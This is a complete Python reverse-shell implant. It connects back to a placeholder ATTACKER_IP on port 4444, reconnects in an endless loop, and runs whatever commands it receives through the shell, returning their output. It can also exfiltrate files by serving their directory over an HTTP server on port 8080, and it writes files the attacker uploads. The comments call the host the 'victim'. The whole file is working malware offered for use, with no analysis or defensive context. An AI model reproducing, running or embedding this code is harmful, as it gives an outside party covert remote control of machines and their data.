import socket
import subprocess
import os
import time
import threading

ATTACKER_IP = "ATTACKER_IP"  # Change to your attacker's IP
PORT = 4444  # Reverse shell port
HTTP_PORT = 8080  # File transfer HTTP server port



def get_ip_address():
    """Get the correct IP address of the victim machine"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Connect to an external server
    ip_addr = s.getsockname()[0]  # Get assigned IP
    s.close()
    return ip_addr

def start_http_server(directory):
    """Starts an HTTP server in the given directory"""
    os.chdir(directory)
    command = f"python -m http.server {HTTP_PORT}"
    subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_unique_filename(filename):
    """Ensure the uploaded file does not overwrite existing files."""
    base, ext = os.path.splitext(filename)
    counter = 1
    while os.path.exists(filename):
        filename = f"{base}({counter}){ext}"
        counter += 1
    return filename



def receive_file(client, filename):
    """Receives a file in binary mode without corruption"""
    filename = get_unique_filename(filename)  # Ensure unique filename
    client.send(b"READY")  # Signal attacker to start sending
    with open(filename, "wb") as f:
        while True:
            chunk = client.recv(4096)
            if chunk.endswith(b"EOFEOFEOF"):  # End of File Marker
                f.write(chunk[:-9])  # Remove EOF marker before writing
                break
            f.write(chunk)
    client.send(f"File {filename} uploaded successfully.\n".encode())

def connect_back():
    """Creates a reverse shell and handles commands from the attacker"""
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ATTACKER_IP, PORT))
            
            while True:
                cmd = client.recv(4096).decode().strip()
                if cmd.lower() == "exit":
                    break
                
                elif cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1]
                    if os.path.exists(filename):
                        file_dir = os.path.dirname(os.path.abspath(filename)) or os.getcwd()
                        threading.Thread(target=start_http_server, args=(file_dir,)).start()
                        time.sleep(1)  # Wait for server to start
                        ip_addr = get_ip_address()
                        download_link = f"http://{ip_addr}:{HTTP_PORT}/{os.path.basename(filename)}"
                        client.send(f"File available at: {download_link}\n".encode())
                    else:
                        client.send("File not found.\n".encode())

                elif cmd.startswith("upload "):
                    filename = cmd.split(" ", 1)[1]
                    receive_file(client, filename)

                else:
                    output = subprocess.run(cmd, shell=True, capture_output=True)
                    client.send(output.stdout + output.stderr)
            
            client.close()
        except:
            time.sleep(5)  # Avoid excessive reconnection attempts

if __name__ == "__main__":
    connect_back()
